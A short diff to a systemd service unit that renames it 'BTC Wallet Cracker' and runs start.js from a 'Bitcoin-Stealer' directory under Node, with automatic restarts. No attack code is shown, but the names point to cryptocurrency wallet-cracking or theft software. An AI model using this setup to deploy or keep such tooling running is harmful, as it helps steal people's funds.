@@ -1,11 +1,13 @@
 [Unit]
-Description=generator.js
+Description=BTC Wallet Cracker
 After=network.target
 
 [Service]
+RestartSec=5
+WorkingDirectory=/home/deface/Bitcoin-Stealer/Linux
 Type=simple
 User=deface
-ExecStart=/usr/bin/node /home/deface/Bitcoin-Stealer/Linux/
+ExecStart=/home/deface/.nvm/versions/node/v16.4.0/bin/node /home/deface/Bitcoin-Stealer/Linux/start.js
 Restart=on-failure
 
 [Install]
